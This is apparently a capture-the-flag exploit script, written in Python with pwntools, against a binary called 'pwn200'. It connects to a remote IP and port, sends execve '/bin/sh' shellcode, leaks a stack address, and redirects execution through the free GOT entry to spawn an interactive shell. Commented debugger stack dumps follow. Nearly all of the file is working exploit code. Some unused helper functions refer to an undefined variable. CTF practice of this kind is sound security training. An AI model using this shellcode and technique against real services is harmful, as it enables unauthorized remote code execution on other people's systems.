# coding:utf-8
#!/usr/bin/env python2
import copy
from ctypes import *
from pwn import *
elf = ELF('./pwn200')
libc = ELF("/home/moonagirl/moonagirl/libc/libc_local_x64")
LOCAL = 0
if LOCAL:
    io = process('./pwn200')#,env={"LD_PRELOAD":"./libc-2.24.so"})
    context.log_level = 'debug'
else:
    io = remote("47.104.16.75", 8997)#47.104.16.75 8997
#    context.log_level = 'debug'

def z(a=''):
	gdb.attach(p,a)
	if a == '':
		raw_input()

def check_in(len,money):
	p.recvuntil('your choice : ')
	p.sendline('1')
	p.recvuntil('how long?\n')
	p.sendline(str(len))
	p.sendline(money)

def check_out():
	p.recvuntil('your choice : ')
	p.sendline('2')


shellcode = "\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05"

io.recvuntil("who are u?\n")
payload = shellcode.ljust(48)
io.send(payload)
io.recvuntil(payload)
ret = io.recv()[:6]
rbp = u64(ret.ljust(8, "\x00"))


log.info(hex(rbp))

io.sendline("0")
io.recvuntil("give me money~\n")

shellcode_addr = rbp - 0x50
log.success("shellcode addr => {}".format(hex(shellcode_addr)))

payload  = p64(shellcode_addr)
payload  = payload.ljust(56, "\x00")
payload += p64(elf.got["free"])
io.send(payload)

io.sendline("2")
io.interactive()




# 00007FFFBD0CC5A0  3131313131313131  
# 00007FFFBD0CC5A8  3131313131313131  
# 00007FFFBD0CC5B0  3131313131313131  
# 00007FFFBD0CC5B8  3131313131313131  
# 00007FFFBD0CC5C0  3131313131313131  
# 00007FFFBD0CC5C8  3131313131313131  
# 00007FFFBD0CC5D0  00007FFFBD0CC5F0  [stack]:00007FFFBD0CC5F0
# 00007FFFBD0CC5D8  0000000000400B59  main+23



# 00007FFEF963D1A8  0000000000400A77  sub_400A29+4E
# 00007FFEF963D1B0  00007F0A31313131  <----------------------------------buf
# 00007FFEF963D1B8  0000000000000000  
# 00007FFEF963D1C0  0000000000000000  
# 00007FFEF963D1C8  00007F22138EEE90  libc_2.23.so:atoi+10
# 00007FFEF963D1D0  0000000000000009  
# 00007FFEF963D1D8  00000000004008B5  give_id:locret_4008B5
# 00007FFEF963D1E0  0000000000003834  
# 00007FFEF963D1E8  0000000001FFB010  [heap]:0000000001FFB010
# 00007FFEF963D1F0  00007FFEF963D250  [stack]:00007FFEF963D250
# 00007FFEF963D1F8  0000000000400B34  game+A6
# 00007FFEF963D200  00007F2213C7C8E0  libc_2.23.so:_IO_2_1_stdin_
# 00007FFEF963D208  00007F2213E89700  debug002:00007F2213E89700
# 00007FFEF963D210  0000000000000004  
# 00007FFEF963D218  0000000000000030  
# 00007FFEF963D220  00007F0031313131  <----------------------------------name
# 00007FFEF963D228  00007F2213927FB4  libc_2.23.so:setvbuf+144
# 00007FFEF963D230  0000000000000000  
# 00007FFEF963D238  0000000000000000  
# 00007FFEF963D240  00007FFEF963D250  [stack]:00007FFEF963D250
# 00007FFEF963D248  00000000004007DD  init_0+40